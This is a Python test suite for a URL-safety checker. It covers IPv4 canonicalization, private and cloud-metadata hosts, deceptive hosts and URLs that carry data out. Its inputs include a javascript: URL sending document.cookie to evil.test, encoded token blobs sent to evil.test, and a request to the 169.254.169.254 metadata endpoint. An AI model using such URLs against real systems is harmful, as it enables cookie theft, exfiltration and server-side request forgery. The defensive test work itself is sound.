"""URL analysis: where does this actually point, and what is riding along?"""

from bulwark.urlcheck import (
    HostKind,
    analyze,
    classify_host,
    ipv4_to_string,
    is_metadata_host,
    is_private_host,
    parse_ipv4,
    split_url,
)


def _categories(url, **kwargs):
    return {f.category for f in analyze(url, **kwargs).findings}


# --- IPv4 canonicalization -------------------------------------------------

def test_every_inet_aton_spelling_of_loopback_canonicalizes():
    for spelling in ("127.0.0.1", "2130706433", "0177.0.0.1", "0x7f.0.0.1", "127.1", "127.0.1"):
        assert ipv4_to_string(parse_ipv4(spelling)) == "127.0.0.1", spelling


def test_non_addresses_are_rejected():
    for text in ("1.2.3.4.5", "999.1.1.1", "example.com", "", "1.2.3.4a", "0x"):
        assert parse_ipv4(text) is None, text


def test_public_addresses_survive_canonicalization():
    assert ipv4_to_string(parse_ipv4("8.8.8.8")) == "8.8.8.8"
    assert not is_private_host("8.8.8.8")


# --- private and metadata hosts --------------------------------------------

def test_private_ranges_are_recognized_in_every_spelling():
    for host in ("127.0.0.1", "2130706433", "10.1.2.3", "192.168.0.5", "172.16.4.4",
                 "169.254.1.1", "100.64.0.1", "0.0.0.0", "localhost", "db.internal",
                 "printer.local", "mybox", "[::1]", "[fe80::1]", "[fd00::1]",
                 "[::ffff:127.0.0.1]"):
        assert is_private_host(host), host


def test_public_hosts_are_not_private():
    for host in ("example.com", "8.8.8.8", "www.reuters.com", "[2606:4700::1111]"):
        assert not is_private_host(host), host


def test_cloud_metadata_endpoints_are_singled_out():
    for host in ("169.254.169.254", "metadata.google.internal", "100.100.100.200", "192.0.0.192"):
        assert is_metadata_host(host), host
    assert "url_metadata_endpoint" in _categories("http://169.254.169.254/latest/meta-data/")


def test_obfuscated_private_ip_is_reported_as_obfuscated():
    cats = _categories("http://2130706433/admin")
    assert "url_private_host" in cats and "url_obfuscated_ip" in cats


# --- deceptive hosts -------------------------------------------------------

def test_userinfo_cannot_disguise_the_destination():
    assessment = analyze("https://trusted.example.com@attacker.test/collect")
    assert assessment.canonical_host == "attacker.test"
    assert assessment.has_credentials
    assert "url_credentials" in {f.category for f in assessment.findings}


def test_repeated_at_signs_resolve_to_the_last_host():
    assert analyze("https://a@b@attacker.test/x").canonical_host == "attacker.test"


def test_punycode_and_mixed_script_hosts_are_flagged():
    assert "url_punycode" in _categories("https://xn--pple-43d.com/login")
    assert "url_mixed_script" in _categories("https://аpple.com/login")   # Cyrillic а


def test_active_schemes_are_critical_and_do_not_double_report():
    cats = _categories('javascript:fetch("//evil.test/?d="+document.cookie)')
    assert "url_active_scheme" in cats
    assert "url_malformed" not in cats


def test_trailing_dot_does_not_defeat_the_host_check():
    assert is_private_host("localhost.")


# --- data-carrying URLs ----------------------------------------------------

BLOB = "eyJjb252ZXJzYXRpb24iOiJzZWNyZXQtdG9rZW4tMTIzNDU2Nzg5MCJ9"


def test_payload_is_caught_in_query_path_fragment_and_subdomain():
    assert "url_opaque_payload" in _categories(f"https://evil.test/?d={BLOB}")
    assert "url_opaque_payload" in _categories(f"https://evil.test/{BLOB}")
    assert "url_opaque_payload" in _categories(f"https://evil.test/#{BLOB}")
    assert "url_opaque_payload" in _categories(f"https://{BLOB}.evil.test/")


def test_ordinary_urls_stay_clean():
    for url in (
        "https://example.com/article",
        "https://www.reuters.com/world/europe/story-2026-07-29/",
        "https://cdn.jsdelivr.net/npm/pkg@1.2.3/dist/index.min.js",
        "https://docs.example.com/guide?utm_source=newsletter&utm_campaign=summer2026",
        "https://api.github.com/repos/o/r/actions/workflows/ci.yml?query=branch%3Amain",
    ):
        assert analyze(url).safe, url


def test_overlong_urls_are_flagged():
    assert "url_length" in _categories("https://evil.test/?d=" + "A" * 3000, max_opaque=0)


# --- parsing ---------------------------------------------------------------

def test_split_url_handles_ports_paths_queries_and_fragments():
    scheme, userinfo, host, port, path, query, fragment = split_url(
        "https://user:pw@example.com:8443/a/b?x=1&y=2#frag"
    )
    assert (scheme, userinfo, host, port) == ("https", "user:pw", "example.com", 8443)
    assert (path, query, fragment) == ("/a/b", "x=1&y=2", "frag")


def test_ipv6_literals_keep_their_brackets_and_port():
    _, _, host, port, _, _, _ = split_url("http://[::1]:9000/x")
    assert host == "[::1]" and port == 9000


def test_bare_and_scheme_relative_values_are_parsed():
    assert split_url("evil.test/path")[2] == "evil.test"
    assert split_url("//evil.test/path")[2] == "evil.test"


def test_whitespace_inside_a_url_is_stripped_not_trusted():
    # Parser differentials start here: one component sees a host, another sees
    # something else. Normalize before classifying.
    assert split_url("http://evil\n.test/x")[2] == "evil.test"


def test_classify_host_labels_kinds():
    assert classify_host("example.com")[0] is HostKind.DOMAIN
    assert classify_host("127.0.0.1")[0] is HostKind.IPV4
    assert classify_host("[::1]")[0] is HostKind.IPV6
    assert classify_host("")[0] is HostKind.EMPTY
